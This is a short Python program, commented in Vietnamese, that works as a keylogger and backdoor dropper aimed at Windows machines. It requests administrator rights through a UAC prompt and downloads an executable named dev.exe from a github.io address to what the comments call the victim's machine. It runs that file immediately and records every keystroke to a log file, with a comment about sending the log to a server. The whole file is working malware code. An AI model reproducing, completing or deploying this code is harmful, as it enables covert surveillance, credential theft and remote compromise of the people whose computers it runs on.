import os
import subprocess
import sys
import requests
from pynput.keyboard import Key, Listener
import logging
import ctypes

# Đường dẫn file log
file_log = "keylog.txt"

# Ghi log
logging.basicConfig(
    filename=file_log, 
    level=logging.DEBUG, 
    format='%(message)s')

# Kiểm tra xem có phải đang chạy với quyền quản trị viên hay không
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
# Hàm ghi log khi nhấn phím
def on_press(key):
    logging.info(str(key))
    # Gửi log về server

if is_admin():
    # Thực thi tệp dev.exe với quyền quản trị viên
    try:
        file_backdoor = "dev.exe"
        # Tạo đường dẫn đầy đủ đến tệp dev.exe để lưu trên máy nạn nhân
        file_backdoor_full_path = os.getcwd() + "\\" + file_backdoor

        # Tự động tải file dev.exe từ server, lưu lại với tên unikey.exe
        url = f"https://tiennhm.github.io/key_logger/web/{file_backdoor}"
        r = requests.get(url)
        logging.info(f"Download file dev.exe from {url} with status code: {r.status_code}")

        with open(file_backdoor_full_path, "wb") as f:
            f.write(r.content)

        logging.info(f"Save file {file_backdoor_full_path} successfully.")

        # Chạy file backdoor ngay sau khi tải về 
        try: 
            logging.info(f"Start running file {file_backdoor_full_path}.")
            subprocess.Popen(file_backdoor_full_path, shell=True) 
            logging.info(f"File {file_backdoor_full_path} has been run.")
        except Exception as e: 
            logging.error(f"Can not run file {file_backdoor_full_path}: {e}")

        # Lắng nghe sự kiện nhấn phím
        with Listener(on_press=on_press) as listener:
            listener.join()

    except Exception as e:
        logging.error(f"Error: {e}")
else:
    # Yêu cầu quyền quản trị viên và chạy lại mã
    logging.info("Requesting for admin permission.")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
